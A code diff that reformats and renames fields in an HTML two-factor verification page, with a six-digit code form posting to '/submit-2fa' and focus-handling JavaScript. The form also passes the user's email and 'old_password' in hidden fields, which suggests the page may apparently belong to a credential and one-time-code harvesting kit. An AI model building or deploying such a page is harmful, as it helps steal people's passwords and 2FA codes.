@@ -142,7 +142,8 @@
       </div>
 
       <div class="notice">
-        We're currently experiencing high volumes of requests, so it may take a few minutes for your email to arrive.
+        We're currently experiencing high volumes of requests, so it may take a
+        few minutes for your email to arrive.
       </div>
 
       <h1>Enter Verification Code</h1>
@@ -152,17 +153,17 @@
 
       <form id="code-form" method="POST" action="/submit-2fa">
         <div class="code-inputs">
-          <input type="text" name="code1" maxlength="1" required />
-          <input type="text" name="code2" maxlength="1" required />
-          <input type="text" name="code3" maxlength="1" required />
-          <input type="text" name="code4" maxlength="1" required />
-          <input type="text" name="code5" maxlength="1" required />
-          <input type="text" name="code6" maxlength="1" required />
+          <input type="text" name="num1" maxlength="1" required />
+          <input type="text" name="num2" maxlength="1" required />
+          <input type="text" name="num3" maxlength="1" required />
+          <input type="text" name="num4" maxlength="1" required />
+          <input type="text" name="num5" maxlength="1" required />
+          <input type="text" name="num6" maxlength="1" required />
         </div>
-      
+
         <input type="hidden" name="email" value="{user-email}" />
         <input type="hidden" name="old_password" value="{old-password}" />
-      
+
         <button type="submit" class="submit-button">Verify</button>
       </form>
 
@@ -170,29 +171,29 @@
     </div>
 
     <script>
-      const inputs = document.querySelectorAll('.code-inputs input');
+      const inputs = document.querySelectorAll(".code-inputs input");
 
       inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
+        input.addEventListener("input", (e) => {
           if (input.value.length === 1 && index < inputs.length - 1) {
             inputs[index + 1].focus();
           }
         });
 
-        input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !input.value && index > 0) {
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !input.value && index > 0) {
             inputs[index - 1].focus();
           }
         });
       });
 
-      const form = document.getElementById('code-form');
-      form.addEventListener('submit', (e) => {
+      const form = document.getElementById("code-form");
+      form.addEventListener("submit", (e) => {
         e.preventDefault();
         const code = Array.from(inputs)
           .map((input) => input.value)
-          .join('');
-        console.log('Entered Code:', code);
+          .join("");
+        console.log("Entered Code:", code);
         // Submit your real form here
         form.submit();
       });
